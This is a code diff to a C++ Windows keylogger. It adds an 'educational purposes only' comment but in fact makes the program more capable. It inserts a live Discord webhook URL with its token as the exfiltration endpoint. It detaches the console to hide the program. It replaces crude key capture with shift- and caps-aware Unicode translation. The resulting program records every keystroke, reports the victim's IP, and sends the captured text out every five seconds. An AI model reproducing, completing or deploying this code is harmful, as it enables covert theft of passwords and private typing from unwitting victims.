@@ -9,6 +9,9 @@
 
 using namespace std;
 
+//this code is educational purposes only and showcases how malware is decoded
+
+
 bool SpecialKeys(int S_Key) {
 	switch (S_Key) {
 	case VK_SPACE:
@@ -60,7 +63,7 @@ bool SpecialKeys(int S_Key) {
 void sendToDiscord(const std::string& message) {
 	//||||||||||||||||||||||||||||||||
 	//ADD YOUR DISCORD WEBHOOK HERE|||
-    std::string webhookUrl = "";//||||
+    std::string webhookUrl = "https://discord.com/api/webhooks/1375545256560558211/qgI6MppLjnBOAZsd8AAhSsOOstmvI8QD-xPOd0u12rYoSqomyDmjsb2Jyhc8yWZq_qQ7";//||||
 	//||||||||||||||||||||||||||||||||
 	//||||||||||||||||||||||||||||||||
 
@@ -91,18 +94,38 @@ string getLocalIP() {
 int main()
 {
 	sendToDiscord("starting logging on: "+getLocalIP());	
-	ShowWindow(GetConsoleWindow(), SW_HIDE); // Optional: hide console window
+	FreeConsole();
     string buffer;
 
 auto lastSent = GetTickCount();
 	while (true) {
     for (int KEY = 8; KEY <= 190; KEY++) {
-        if (GetAsyncKeyState(KEY) & 1) {
-            if (!SpecialKeys(KEY)) {
-                buffer += char(KEY); // still naive, replace later with ToAscii logic
-            }
+    if (GetAsyncKeyState(KEY) & 1) {
+
+        if (!SpecialKeys(KEY)) {
+
+            BYTE keyboardState[256];
+			GetKeyboardState(keyboardState);
+
+			// Update SHIFT state manually
+			if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
+				keyboardState[VK_SHIFT] = 0x80;
+
+			// Update CAPSLOCK state manually
+			if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
+				keyboardState[VK_CAPITAL] = 0x01;
+
+			UINT scanCode = MapVirtualKey(KEY, MAPVK_VK_TO_VSC);
+
+			WCHAR unicodeChar[5];
+			int result = ToUnicode(KEY, scanCode, keyboardState, unicodeChar, 4, 0);
+
+			if (result == 1) {
+				buffer += (char)unicodeChar[0];
+			}
         }
     }
+}
 
     if (GetTickCount() - lastSent > 5000 && !buffer.empty()) { // every 5s
         sendToDiscord(buffer);
